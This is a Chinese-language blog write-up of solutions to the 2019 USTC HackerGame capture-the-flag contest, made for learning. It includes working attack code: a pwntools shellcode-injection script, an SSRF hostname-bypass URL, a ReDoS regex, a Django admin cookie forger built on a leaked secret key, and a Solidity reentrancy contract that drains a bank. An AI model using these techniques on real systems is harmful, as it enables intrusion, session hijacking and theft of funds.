---
title: 2019 USTC HackerGame Writeup
date: 2019-10-23T01:51:17.045Z
updated: 2019-10-23T01:51:17.072Z
tags:
  - HackerGame
  - CTF
categories:
  - CTF
---
去年参加了 USTCLUG 的 HackerGame, 今年我又来答题啦（

<!--more-->

## 签到题

题目很简单, 你只需要把按钮的 disabled 属性删掉就能拿到 flag 了

## 白与夜

这题也很简单，我直接拖进 GIMP 就拿到了 Flag

![GIMP.png](https://i.loli.net/2019/10/23/ZikDmBGdqWvKXeO.png)

## 信息安全 2077

打开 Inspector 可以看到题目的 Javascript 代码

```javascript
(function () {
    var now = new Date().toUTCString()
    var main = document.getElementsByTagName('main')[0]
    var ua = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36'
    fetch('flag.txt', {method: 'POST', headers: {'If-Unmodified-Since': now, 'User-Agent': ua}}).then(function (res) {
    if (res.ok) {
        res.text().then(function (text) {
        main.innerText = 'The flag is "' + text + '".'
        })
    } else {
        var lastModified = res.headers.get('Last-Modified')
        setInterval(function () {
        var diff = (new Date(lastModified).getTime() - Date.now()) / 1000
        var diffSeconds = Math.floor(diff % 86400), diffDays = Math.floor(diff / 86400)
        main.innerText = 'Not yet! The competition will start after ' + diffDays + ' days and ' + diffSeconds + ' seconds.'
        }, 1000)
    }
    })
})()
```

根据代码, 我们需要 POST 一个 `lastModified` 匹配的 `If-Unmodified-Since` 到 flag.txt

那么我们直接用

```javascript
fetch('flag.txt', {method: 'POST', headers: {'If-Unmodified-Since': 'Fri, 01 Oct 2077 00:00:00 GMT'}}).then(res => res.text()).then(console.log)
```

就可以拿到 flag 了

## 宇宙终极问题

我只找到一个 42 的, 这题 Google 题（确信

## 网页读取器

下载代码, 可以看到检查 hostname 的逻辑

我们可以看到他会 strip `@` 前面的内容

我们可以构造出如下的 URL

```
http://web/flag?@example.com
```

## 达拉崩吧大冒险

打开题目, 把玩一阵之后发现在加攻击力的地方没有进行校验, 那我们可以通过输入负数来让我们的攻击力溢出

直接 DevTools 修改 Option 的 value 为 `-2700000000000000000` 然后提交就好了

## Happy LUG

看到题目中的

> 虽然浏览器访问不了，但这个域名确实是存在着的。

我就知道应该是获取这个域名的 TXT 内容

当时做题的时候我一直给 ustclug 中间加了点, 然后一直拿不到记录, 知道有人提醒我换行没有点才反应过来（跑

## 正则验证器

是利用正则表达式的灾难性回溯卡 Python 一秒来获取 flag

[拓展阅读](www.regular-expressions.info/catastrophic.html)

```
Regex: (a*)*$String: aaaaaaaaaaaaaaaaaaaaaaab
```

这道题长度卡的太死了（不然肯定各种奇怪的正则（跑

利用 regex101 也可以看到 `Catastrophic Backtracking` 的提示

![image.png](https://i.loli.net/2019/10/23/39XHJ1USwcqVGf2.png)

## 不同寻常的 Python 考试

这题不讲，嗯 各种 Python 的奇怪判断

拿了 75 分, 要暴打出题人（被打

## 小巧玲珑的 ELF

直接 ELF 拖进 IDA Pro 就可以看到内部逻辑 然后写一个程序自动求解

```javascript
const data = [
    102, 110, 101, 107, -125, 78, 109, 116, -123, 122, 111,
    87, -111, 115, -112, 79, -115, 127, 99, 54, 108, 110,
    -121, 105, -93, 111, 88, 115, 102, 86, -109, -97, 105, 
    112, 56, 118, 113, 120, 111, 99, -60, -126, -124, -66, -69, -51
]

const rbit = data.map((it, index) => {
    let i = it + index

    i ^= index
    i -= 2 * index

    return i
})

console.log(Buffer.from(rbit).toString())
```

## Shell 骇客

只做了第一题, 我永远喜欢 PwnTools （跑

```python
from pwn import *
import time
context(arch = 'x86_64', os = 'linux')

r = remote('202.38.93.241', 10000)
time.sleep(1)
r.sendline('Token')
r.sendline(asm(shellcraft.sh()))
r.interactive()
```

找到了 `pwn.encoders.encoder.encode` 这个方法, 但是没找到 `msfvenom` 这个工具, 可能还是我太菜了

而且我还把 target 当成 `x64` 了（捂脸

## 三教奇妙夜

参考 <https://stackoverflow.com/questions/37088517/ffmpeg-remove-sequentially-duplicate-frames> 删除重复帧然后把帧抽成图片

```
ffmpeg -i input.mp4 -vf mpdecimate,setpts=N/FRAME_RATE/TB out.mp4
ffmpeg -i out.mp4 -f image2 %02d.png
```

## 献给最好的你

反编译 JAR, 找到 `com.hackergame.eternalEasterlyWind.data.LoginDataSource` 看到了一串 base64

然后看了下前面的逻辑是把小写转大写, 大写转小写, 反操作一下就拿到了密码

这时候打开 app 输入就拿到 flag 了（懒得看下面代码

## 天书残篇

搜索一通发现是 [Whitespace (programming language)](https://en.wikipedia.org/wiki/Whitespace_(programming_language))

找到一个 [在线 IDE](https://vii5ard.github.io/whitespace/)

找到 `label 53` 发现是输出 `Congratulations`

于是往回推就找到了怎么生成的 flag

## 我想要个家

一开始是想拿 Docker 来做, 然后发现 `scratch` 还是有 /proc 目录 然后我就想到了 chroot

我直接塞了一个 busybox 进了 chroot 于是 sleep 10s 我就直接 

```
/busybox sleep 10
```

要注意要把 host 上的 /dev 挂载到 chroot 下

```
mount --rbind /dev dev/
```

## 被泄漏的姜戈

自己构造的 admin cookie, 学习了很多 django 相关的东西（跑

```python
#!/usr/bin/python3

import base64
import datetime
import json
import re
import time
import zlib
import hmac
import hashlib
from django.utils import baseconv
from django.core.signing import Signer

USER_SALT = "d7um#o19q+v24!vkgzrxme41wz5#_h0#f_6u62fx0m@k&uwe39"

def b64_encode(s):
    return base64.urlsafe_b64encode(s).strip(b'=')

def b64_decode(s):
    pad = '=' * (len(s) % 4)
    return base64.urlsafe_b64decode(s + str(pad))


def base64_hmac(salt, value, key):
    return b64_encode(salted_hmac(salt, value, key).digest()).decode()

def unzip(value):
    v = b64_decode(value)
    data = zlib.decompress(v)

    return data

result = unzip("eJxVjDEOwjAMRe_iGUVNZCUxIztniFw7JQWUSE07Ie4OlTrA-t97_wWJt7WkreclzQpnsHD63UaWR6470DvXWzPS6rrMo9kVc9Burk3z83K4fweFe_nWEwX0njJ7DDIMSDGyY0JyFicrqBxInUR4fwDjcTDI")
print(result)


def force_bytes(s, encoding='utf-8', strings_only=False, errors='strict'):
    """
    Similar to smart_bytes, except that lazy instances are resolved to
    strings, rather than kept as lazy objects.
    If strings_only is True, don't convert (some) non-string-like objects.
    """
    # Handle the common case first for performance reasons.
    if isinstance(s, bytes):
        if encoding == 'utf-8':
            return s
        else:
            return s.decode('utf-8', errors).encode(encoding, errors)
    if strings_only and is_protected_type(s):
        return s
    if isinstance(s, memoryview):
        return bytes(s)
    return str(s).encode(encoding, errors)


def hash_password(password):
    key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
    key = hashlib.sha1(force_bytes(key_salt) + force_bytes(USER_SALT)).digest()

    return hmac.new(key, msg=force_bytes(password), digestmod=hashlib.sha1).hexdigest()

print(hash_password("pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="))

new_doc = b'{"_auth_user_id":"1","_auth_user_backend":"django.contrib.auth.backends.ModelBackend","_auth_user_hash":"569127665f950beb6dd4a55098a8768f58814b04"}'

def sign(doc):
    d = zlib.compress(doc)
    d = "." + b64_encode(d).decode()
    ts = baseconv.base62.encode(int(time.time()))

    value = '%s:%s' % (d, ts)
    s = Signer(key=USER_SALT, salt="django.contrib.sessions.backends.signed_cookies")

    return s.sign(value)


print(sign(new_doc))
```

## PowerShell 迷宫

这题没啥难点，就拿 Powershell 暴力搜就完事了

```powershell
using namespace System.Collections.Generic
using namespace System

function Sacn($dir, $d) {
    $pos = [Tuple[int, int]]::new($_.X, $_.Y)
    $path = "$dir/$d"
    Write-Output "Scan dir: $path"
    (Get-ChildItem $path) | ForEach-Object {
        if (!([string]::IsNullOrEmpty($_.Flag))) {
            Write-Output $_.Flag
            Exit
        }
    }

    (Get-ChildItem $path) | ForEach-Object {
        $dire = $_.Direction

        $isScan = $true
        $nextPost = [Tuple[int, int]]::new($_.X, $_.Y)

        if ($dire -eq "Left") {
            $nextPost = [Tuple[int, int]]::new($_.X - 1, $_.Y)

            if ($d -eq "Right") {
                $isScan = $false
            }
        }
        if ($dire -eq "Up") {
            $nextPost = [Tuple[int, int]]::new($_.X, $_.Y + 1)
            if ($d -eq "Down") {
                $isScan = $false
            }
        }
        if ($dire -eq "Right") {
            $nextPost = [Tuple[int, int]]::new($_.X + 1, $_.Y)
            if ($d -eq "Left") {
                $isScan = $false
            }
        }
        if ($dire -eq "Down") {
            $nextPost = [Tuple[int, int]]::new($_.X, $_.Y - 1)
            if ($d -eq "Up") {
                $isScan = $false
            }
        }

        if (!($list -contains $nextPost)) {
            if ($isScan) {
                Sacn "$path" $dire
            }
        }
        
    }
}

Sacn ./Down Right
```

最大难题就是我不是 DotNet 教的（跑

## 韭菜银行

第一小题可以直接看见 private 中 init 的值

```python
O = 1940577538063170034860903343625652396

result = []

for index in range(32):
    b = (O >> (index * 4)) & 0xF

    if b < 10:
        result.append(b + 48)
    else:
        result.append(b + 87)
    
result.reverse()
print("".join(map(chr, result)))
```

第二题是著名的 `The DAO` 的攻击

我写的攻击合约是这样的

```
pragma solidity >=0.4.26;

contract Target {
    function withdraw(uint amount) public;
    function get_flag_2(uint user_id) public;
    function deposit() public payable;
}

contract JCBankHacker {
    address owner;
    address bank;
    uint balanceInBank;
    uint step;
    
    modifier ownerOnly { require(owner == msg.sender); _; }
    
    constructor (address b) public {
        owner = msg.sender;
        bank = b;
        step = 0;
    }
    
    function setBankAddr(address bankAddr) ownerOnly {
        bank = bankAddr;
    }
    
    function killWorld() ownerOnly {
        selfdestruct(owner);
    }
    
    function getFlag() ownerOnly {
        Target bankInstance = Target(bank);
        bankInstance.get_flag_2(1);
    }
    
    // Attack implements
    function () payable {
        Target bankInstance = Target(bank);
        
        if (step == 0) {
            bankInstance.deposit.value(msg.value)();
            step += 1;
            bankInstance.withdraw(msg.value);
        }
        
        if (step == 1) {
            step = 2;
            bankInstance.withdraw(msg.value);
        }
    }
}
```

## 没有 BUG 的教务系统

只做了第一题, 发现密码化简一下是三个 XOR

```python
origin = [
    0x44,0x00,0x02,0x41,0x43,0x47,0x10,0x63,0x00
]

import sys

r = list(range(8))
r.reverse()

for index in r:
    # (A XOR B) XOR i
    origin[index] ^= index
    origin[index] ^= origin[index + 1]

for char in origin[:-1]:
    sys.stdout.write(chr(char))
```

## 总结

这次 HackerGame 还是比较有意思的

据内部人员说一开始都想出难题（感觉到了）然后后面加了几个简单的题 然后题目数量爆炸 真的多

再加上这几天都在摸鱼没怎么搞（不是

最后拿了 top40 也满足了（跑
